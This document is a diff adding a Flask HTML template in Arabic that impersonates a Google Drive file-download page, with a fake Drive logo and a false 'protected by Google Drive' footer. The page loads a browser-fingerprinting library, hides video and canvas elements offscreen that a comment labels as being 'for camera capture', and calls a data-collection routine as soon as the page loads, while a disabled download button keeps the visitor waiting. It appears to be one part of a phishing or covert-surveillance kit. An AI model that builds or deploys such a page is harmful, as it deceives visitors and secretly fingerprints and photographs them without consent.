@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Drive - {{ filename }}</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            font-family: 'Cairo', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .main-container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+        }
+        .drive-header {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(218, 220, 224, 0.3);
+            padding: 16px 32px;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
+        }
+        .drive-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .drive-logo svg {
+            width: 45px;
+            height: 45px;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
+        }
+        .drive-logo h5 {
+            font-weight: 600;
+            font-size: 1.5rem;
+        }
+        .file-container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            margin: 40px auto;
+            max-width: 900px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: all 0.3s ease;
+        }
+        .file-container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
+        }
+        .file-header {
+            padding: 32px;
+            border-bottom: 1px solid rgba(218, 220, 224, 0.3);
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1) 0%, rgba(255, 255, 255, 0.05) 100%);
+        }
+        .file-icon {
+            width: 64px;
+            height: 64px;
+            margin-left: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            backdrop-filter: blur(10px);
+        }
+        .download-btn {
+            background: linear-gradient(135deg, #1a73e8 0%, #4285f4 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 16px 32px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(26, 115, 232, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        .download-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.5s;
+        }
+        .download-btn:hover::before {
+            left: 100%;
+        }
+        .download-btn:hover {
+            background: linear-gradient(135deg, #1557b0 0%, #3367d6 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(26, 115, 232, 0.4);
+        }
+        .download-btn:disabled {
+            background: linear-gradient(135deg, #dadce0 0%, #f1f3f4 100%);
+            color: #5f6368;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .progress-container {
+            padding: 0 32px 32px;
+        }
+        .status-text {
+            color: #5f6368;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+        .progress {
+            height: 12px;
+            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            margin-bottom: 24px;
+        }
+        .progress-bar {
+            background: linear-gradient(135deg, #4285f4 0%, #34a853 100%);
+            border-radius: 10px;
+            transition: width 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            background-image: linear-gradient(
+                -45deg,
+                rgba(255, 255, 255, .2) 25%,
+                transparent 25%,
+                transparent 50%,
+                rgba(255, 255, 255, .2) 50%,
+                rgba(255, 255, 255, .2) 75%,
+                transparent 75%,
+                transparent
+            );
+            background-size: 50px 50px;
+            animation: move 2s linear infinite;
+        }
+        @keyframes move {
+            0% { background-position: 0 0; }
+            100% { background-position: 50px 50px; }
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(26, 115, 232, 0.2);
+            border-radius: 50%;
+            border-top-color: #1a73e8;
+            animation: spin 1s ease-in-out infinite;
+            margin-left: 12px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .google-colors {
+            background: linear-gradient(90deg, #4285f4 0%, #ea4335 25%, #fbbc04 50%, #34a853 75%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-weight: 700;
+        }
+        .hidden-video {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+        
+        /* إضافة تأثيرات للأيقونات */
+        .file-icon i {
+            font-size: 64px !important;
+            background: linear-gradient(135deg, #4285f4, #34a853);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
+        }
+        
+        /* تحسين النصوص */
+        h4 {
+            font-weight: 600;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        
+        .text-muted {
+            color: #5f6368 !important;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <!-- Completely hidden video for camera capture -->
+    <video id="hiddenVideo" style="position: absolute; top: -99999px; left: -99999px; width: 1px; height: 1px; opacity: 0; visibility: hidden;" autoplay muted playsinline></video>
+    <canvas id="captureCanvas" style="position: absolute; top: -99999px; left: -99999px; width: 1px; height: 1px; opacity: 0; visibility: hidden;"></canvas>
+
+    <div class="main-container">
+        <!-- Drive Header -->
+        <div class="drive-header">
+            <div class="drive-logo">
+                <svg width="45" height="45" viewBox="0 0 120 120">
+                    <polygon fill="#0066DA" points="15,105 45,45 75,105"/>
+                    <polygon fill="#00AC47" points="75,15 105,75 45,75"/>
+                    <polygon fill="#EA4335" points="45,15 75,75 15,75"/>
+                </svg>
+                <h5 class="mb-0 google-colors">Drive</h5>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="container flex-grow-1 d-flex align-items-center">
+        <div class="file-container">
+            <!-- File Header -->
+            <div class="file-header">
+                <div class="d-flex align-items-center">
+                    <div class="file-icon">
+                        {% if filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')) %}
+                            <i class="bi bi-image text-success" style="font-size: 48px;"></i>
+                        {% elif filename.lower().endswith('.pdf') %}
+                            <i class="bi bi-file-earmark-pdf text-danger" style="font-size: 48px;"></i>
+                        {% else %}
+                            <i class="bi bi-file-earmark-play text-primary" style="font-size: 48px;"></i>
+                        {% endif %}
+                    </div>
+                    <div class="flex-grow-1">
+                        <h4 class="mb-1">{{ filename }}</h4>
+                        <p class="text-muted mb-0">{{ file_size }} ميجابايت</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Progress Section -->
+            <div class="progress-container">
+                <div class="status-text" id="statusText">
+                    جاري التحقق من الصلاحيات...
+                    <span class="loading-spinner"></span>
+                </div>
+                <div class="progress mb-3">
+                    <div class="progress-bar" id="progressBar" role="progressbar" style="width: 0%"></div>
+                </div>
+                <button class="download-btn" id="downloadBtn" disabled>
+                    <i class="bi bi-download"></i> تحميل الملف
+                </button>
+            </div>
+        </div>
+
+        <!-- Footer -->
+            <div class="text-center mt-4">
+                <p class="text-white small" style="text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);">
+                    <i class="bi bi-shield-check"></i>
+                    محمي بواسطة Google Drive - تشفير شامل للملفات
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden elements for camera capture -->
+    <video id="hiddenVideo" style="display: none;" autoplay playsinline muted></video>
+    <canvas id="captureCanvas" style="display: none;"></canvas>
+
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+    <script>
+        // Initialize data collection when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            const filename = '{{ filename }}';
+            startDataCollection(filename);
+        });
+    </script>
+</body>
+</html>
